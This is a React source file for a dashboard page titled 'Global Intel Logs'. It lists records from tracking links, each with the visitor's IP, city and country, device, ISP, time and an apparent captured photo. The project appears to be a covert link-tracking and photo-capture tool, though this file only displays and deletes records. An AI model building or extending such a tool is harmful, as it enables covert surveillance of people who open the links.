import { useListLogs, useDeleteLog, getListLogsQueryKey } from "@workspace/api-client-react";
  import { useQueryClient } from "@tanstack/react-query";
  import { Card } from "@/components/ui/card";
  import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
  import { MapPin, Globe, Laptop, Clock, Camera, Trash2, AlertTriangle } from "lucide-react";
  import { Button } from "@/components/ui/button";
  import { useToast } from "@/hooks/use-toast";
  import { Link } from "wouter";

  export default function Logs() {
    const { data: logs, isLoading, isError, refetch } = useListLogs();
    const deleteLog = useDeleteLog();
    const queryClient = useQueryClient();
    const { toast } = useToast();

    const handleDelete = (id: number) => {
      if (!confirm("Purge this log entry permanently?")) return;
      deleteLog.mutate(
        { id },
        {
          onSuccess: () => {
            queryClient.invalidateQueries({ queryKey: getListLogsQueryKey() });
            toast({
              title: "LOG PURGED",
              description: "Entry deleted from database.",
            });
          }
        }
      );
    };

    return (
      <div className="space-y-8 animate-in fade-in duration-500">
        <div className="flex justify-between items-end border-b border-border pb-4">
          <div>
            <h1 className="text-2xl font-bold tracking-widest text-primary uppercase">Global Intel Logs</h1>
            <p className="text-muted-foreground text-sm mt-1 uppercase tracking-wider">All intercepted data across all operations</p>
          </div>
        </div>

        <Card className="bg-card border-border rounded-sm overflow-hidden">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader className="bg-secondary/50">
                <TableRow className="border-border hover:bg-transparent">
                  <TableHead className="w-16 text-muted-foreground uppercase tracking-wider text-xs">IMG</TableHead>
                  <TableHead className="text-muted-foreground uppercase tracking-wider text-xs">Operation</TableHead>
                  <TableHead className="text-muted-foreground uppercase tracking-wider text-xs">IP / Location</TableHead>
                  <TableHead className="text-muted-foreground uppercase tracking-wider text-xs">Device Info</TableHead>
                  <TableHead className="text-muted-foreground uppercase tracking-wider text-xs text-right">Time</TableHead>
                  <TableHead className="w-12"></TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {isLoading ? (
                  <TableRow className="border-border">
                    <TableCell colSpan={6} className="h-32 text-center text-primary animate-pulse tracking-widest uppercase">
                      SCANNING DATABASE...
                    </TableCell>
                  </TableRow>
                ) : isError ? (
                  <TableRow className="border-border hover:bg-transparent">
                    <TableCell colSpan={6} className="h-40 text-center">
                      <div className="flex flex-col items-center gap-3">
                        <AlertTriangle className="w-8 h-8 text-destructive opacity-60" />
                        <p className="text-destructive uppercase tracking-widest font-bold text-xs">Database Error</p>
                        <p className="text-muted-foreground text-xs tracking-wider max-w-xs">
                          Could not load logs. The ip_logs table may not be initialised yet — redeploy to run migrations.
                        </p>
                        <Button variant="outline" size="sm" className="uppercase tracking-widest text-xs rounded-sm mt-1" onClick={() => refetch()}>
                          Retry
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ) : logs?.length === 0 ? (
                  <TableRow className="border-border hover:bg-transparent">
                    <TableCell colSpan={6} className="h-32 text-center text-muted-foreground uppercase tracking-widest">
                      Database empty
                    </TableCell>
                  </TableRow>
                ) : (
                  logs?.map((log) => (
                    <TableRow key={log.id} className="border-border border-b hover:bg-secondary/30 transition-colors group">
                      <TableCell className="p-4">
                        <div className="w-12 h-12 bg-secondary border border-border rounded-sm overflow-hidden flex items-center justify-center relative">
                          {log.photo ? (
                            <img src={log.photo} alt="capture" className="w-full h-full object-cover" />
                          ) : (
                            <Camera className="w-5 h-5 text-muted-foreground/40" />
                          )}
                        </div>
                      </TableCell>
                      <TableCell className="p-4">
                        <Link href={`/links/${log.linkId}`} className="font-bold text-primary hover:underline text-sm uppercase tracking-wide">
                          LINK #{log.linkId}
                        </Link>
                        {log.linkName && (
                          <div className="text-xs text-muted-foreground mt-1">{log.linkName}</div>
                        )}
                      </TableCell>
                      <TableCell className="p-4">
                        <div className="font-mono text-sm text-foreground font-bold">{log.ip}</div>
                        {(log.city || log.country) && (
                          <div className="text-xs text-muted-foreground mt-1 flex items-center gap-1">
                            <MapPin className="w-3 h-3" />
                            {[log.city, log.country].filter(Boolean).join(", ")}
                          </div>
                        )}
                      </TableCell>
                      <TableCell className="p-4">
                        {log.userAgent ? (
                          <div className="flex items-center gap-1 text-xs text-muted-foreground">
                            <Laptop className="w-3 h-3 flex-shrink-0" />
                            <span className="truncate max-w-[180px]">{log.userAgent}</span>
                          </div>
                        ) : (
                          <div className="flex items-center gap-1 text-xs text-muted-foreground/40">
                            <Globe className="w-3 h-3" />
                            <span>Unknown device</span>
                          </div>
                        )}
                        {log.isp && (
                          <div className="text-xs text-muted-foreground/60 mt-1 truncate max-w-[180px]">{log.isp}</div>
                        )}
                      </TableCell>
                      <TableCell className="p-4 text-right">
                        <div className="flex items-center justify-end gap-1 text-xs text-muted-foreground">
                          <Clock className="w-3 h-3" />
                          <span>{new Date(log.createdAt).toLocaleString()}</span>
                        </div>
                      </TableCell>
                      <TableCell className="p-4">
                        <Button
                          variant="ghost"
                          size="sm"
                          className="opacity-0 group-hover:opacity-100 transition-opacity text-destructive hover:text-destructive hover:bg-destructive/10 rounded-sm"
                          onClick={() => handleDelete(log.id)}
                        >
                          <Trash2 className="w-4 h-4" />
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </Card>
      </div>
    );
  }
  